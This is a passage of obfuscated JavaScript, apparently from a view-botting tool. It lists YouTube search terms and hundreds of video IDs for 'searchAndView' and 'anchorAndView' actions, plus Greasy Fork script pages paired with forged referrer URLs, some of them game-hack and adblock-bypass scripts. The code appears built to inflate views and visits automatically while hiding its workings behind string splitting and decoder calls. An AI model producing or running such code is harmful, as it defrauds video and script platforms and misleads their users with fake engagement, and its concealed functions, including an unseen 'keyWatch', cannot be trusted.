'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + U(0x10) + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](-0x2d4 * 0xb + 0x1 * 0x21df + -0x2b9)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](-0x217 * -0x2 + 0x1 * 0x132b + 0x3 * -0x7c5)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](0x1222 + 0xf81 * -0x2 + -0x1 * -0xce3);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    V(0x14, '@T)i') + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    V(0x18, 'nehn') + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    V(0x15, '!OV#') + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    W(0x1) + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + W(0xd) + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + U(0xa) + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + V(0x11, '1K&p')
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + U(0xb) + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + U(0xf) + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + V(0xe, 'e213') + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + U(0x0)
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
